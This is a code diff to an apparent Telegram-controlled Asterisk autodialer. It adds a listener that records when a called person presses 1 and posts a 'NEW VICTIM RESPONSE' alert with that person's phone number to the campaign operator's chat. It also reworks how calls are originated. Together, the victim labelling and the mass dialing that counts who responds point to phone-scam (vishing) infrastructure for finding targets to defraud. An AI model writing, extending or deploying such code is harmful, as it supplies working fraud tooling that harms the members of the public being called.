@@ -288,7 +288,6 @@ async def execute_retry_call(campaign_id: int, retry_entry: dict):
         
         # Originate the retry call
         result = await originate_autodial_call_from_record(
-            context=global_application_instance,
             call_id=new_call_id,
             tracking_id=tracking_id
         )
@@ -1716,49 +1715,87 @@ async def post_init(application: Application) -> None:
         except Exception as e:
             logger.error(f"Failed to send test notification to user {test_user_id}: {e}")
 
-        # Define the AMI event listener function inside post_init
-        async def ami_event_listener(manager, event):
-            """Handle AMI events."""
-            # Log all received events for debugging
-            logger.debug(f"Received AMI event: {event}")
+        # UserEvent listener for AutoDialResponse events from dialplan
+        async def user_event_listener(manager, event):
+            """Handle UserEvent events from Asterisk dialplan."""
+            user_event_type = event.get('UserEvent')
             
-            # Handle call end events to clean up our tracking
-            if event.name == 'Hangup':
-                call_id = event.get('CallID')
-                if call_id and call_id in active_calls:
-                    update_call_status(call_id, 'completed', datetime.now())
-            
-            # Handle DTMF events
-            elif event.name == 'DTMFEnd':
-                call_id = event.get('CallID')
-                if call_id and call_id in active_calls:
-                    update_call_status(call_id, 'dtmf_received')
-            
-            # Handle UserEvent for IVR timeout detection
-            elif getattr(event, 'name', '') == 'UserEvent':
-                user_event_type = event.get('UserEvent')
-                if user_event_type == 'AutoDialResponse':
-                    # This indicates IVR timeout with no DTMF response
-                    logger.info(f"IVR timeout detected - marking call as potentially blocked")
-                    # Mark this call for blocked classification in hangup event
-                    uniqueid = event.get('Uniqueid')
-                    if uniqueid:
-                        # Store IVR timeout flag for hangup processing
-                        try:
-                            async with get_async_db_session() as session:
-                                call = await Call.find_by_uniqueid(session, uniqueid)
-                                if call:
-                                    call.call_metadata = {
-                                        **(call.call_metadata or {}),
-                                        "ivr_timeout": True,
-                                        "ivr_timeout_time": datetime.now().isoformat()
-                                    }
-                                await session.commit()
-                                logger.info(f"Marked call {call.call_id} with IVR timeout flag")
-                        except Exception as e:
-                            logger.error(f"Error marking IVR timeout: {e}")
-                    else:
-                        logger.debug(f"UserEvent received: {user_event_type}")
+            if user_event_type == 'AutoDialResponse':
+                pressed_one = event.get('PressedOne')
+                uniqueid = event.get('Uniqueid')
+                agent_id = event.get('AgentID')
+                target_number = event.get('CallerID')
+                campaign_id = event.get('CampaignID')
+                
+                logger.info(f"UserEvent AutoDialResponse - PressedOne: {pressed_one}, UniqueID: {uniqueid}, Target: {target_number}")
+                
+                if pressed_one == 'Yes':
+                    # This is the actual DTMF response we need to process
+                    await process_dtmf_response(uniqueid, '1', target_number, campaign_id, agent_id)
+                else:
+                    # No response or invalid digit - this is handled in hangup as failed
+                    logger.info(f"No DTMF response for call {uniqueid}")
+        
+        async def process_dtmf_response(uniqueid, digit, target_number, campaign_id, agent_id):
+            """Process DTMF response from UserEvent."""
+            try:
+                agent_id = int(agent_id) if agent_id else 7991166259
+                campaign_id = int(campaign_id) if campaign_id else None
+                
+                async with get_async_db_session() as session:
+                    call = await Call.find_by_uniqueid(session, uniqueid)
+                    
+                    if call:
+                        # Update call status to indicate DTMF was received
+                        call.status = 'dtmf_processed'
+                        call.dtmf_digits = digit
+                        
+                        # Update call metadata
+                        call.call_metadata = {
+                            **(call.call_metadata or {}),
+                            "dtmf_history": [{
+                                "time": datetime.now().isoformat(),
+                                "digit": digit,
+                                "uniqueid": uniqueid
+                            }],
+                            "dtmf_counted": True
+                        }
+                        
+                        await session.commit()
+                        logger.info(f"Updated call {call.call_id} with DTMF digit {digit}")
+                        
+                        # Get updated values from database record
+                        target_number = call.target_number
+                        campaign_id = call.campaign_id
+                        agent_id = call.agent_telegram_id or agent_id
+                
+                # Send DTMF notification
+                notification = f"🎯 <b>NEW VICTIM RESPONSE</b>\n\n"
+                notification += f"<b>#{campaign_id or 'Unknown'}</b>\n"
+                notification += f"<b>Pressed:</b> <code>{digit}</code>\n\n"
+                notification += f"<b>📱 Phone:</b> <code>{target_number}</code>\n"
+                notification += f"\n<b>⏰ Time:</b> {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}"
+                
+                # Send to campaign chat
+                target_chat_id = agent_id
+                if campaign_id and campaign_id in campaign_messages:
+                    target_chat_id = campaign_messages[campaign_id]["chat_id"]
+                
+                await global_application_instance.bot.send_message(
+                    chat_id=target_chat_id,
+                    text=notification,
+                    parse_mode='HTML'
+                )
+                
+                # Update campaign DTMF count
+                if campaign_id and campaign_id in campaign_states:
+                    campaign_states[campaign_id].dtmf_responses += 1
+                    await update_campaign_message(campaign_id)
+                
+                logger.info(f"Sent DTMF notification for {target_number} pressing {digit}")
+                
+            except Exception as e:
+                logger.error(f"Error processing DTMF response: {e}", exc_info=True)
         
         # Newchannel event listener to map Uniqueid to call_id using database
         async def new_channel_event_listener(manager, event):
@@ -1924,13 +1961,14 @@ async def post_init(application: Application) -> None:
                 logger.debug(f"Ignoring non-autodial channel: {channel} (Context: {context})")
 
 
-        # Register event listeners (UserEvent removed - using dedicated DTMF listeners)
+        # Register event listeners
         ami_manager.register_event('Newchannel', new_channel_event_listener)
         ami_manager.register_event('Newstate', newstate_event_listener)  # SIP state tracking
         ami_manager.register_event('DialBegin', dial_begin_event_listener)  # Dial attempt tracking
         ami_manager.register_event('DialEnd', dial_end_event_listener)  # Dial result tracking
         ami_manager.register_event('DTMFBegin', dtmf_begin_listener)  # Add DTMFBegin listener
         ami_manager.register_event('DTMFEnd', dtmf_event_listener)
+        ami_manager.register_event('UserEvent', user_event_listener)  # CRITICAL: Handle DTMF from dialplan
         ami_manager.register_event('Hangup', hangup_event_listener) # Register Hangup event listener
         ami_manager.register_event('BridgeEnter', bridge_event_listener) # Register Bridge event listener for ICM
         logger.info("AMI event listeners registered.")
@@ -2836,9 +2874,9 @@ async def hangup_event_listener(manager, event):
     except Exception as e:
         logger.error(f"Error processing hangup event: {e}", exc_info=True)
 
-async def originate_autodial_call_from_record(context: ContextTypes.DEFAULT_TYPE, call_id: str, tracking_id: str) -> dict:
+async def originate_autodial_call_from_record(call_id: str, tracking_id: str) -> dict:
     """Originate a call using a pre-created call record."""
-    ami_manager = context.application.bot_data.get("ami_manager")
+    ami_manager = global_application_instance.bot_data.get("ami_manager")
     
     if not ami_manager:
         logger.error("AMI not connected for auto-dial")
@@ -3497,7 +3535,6 @@ async def handle_auto_dial(update: Update, context: ContextTypes.DEFAULT_TYPE) -
                 
                 # Use the asterisk_trunk_name from the agent record
                 result = await originate_autodial_call_from_record(
-                    context=context,
                     call_id=call_id,
                     tracking_id=tracking_id
                 )
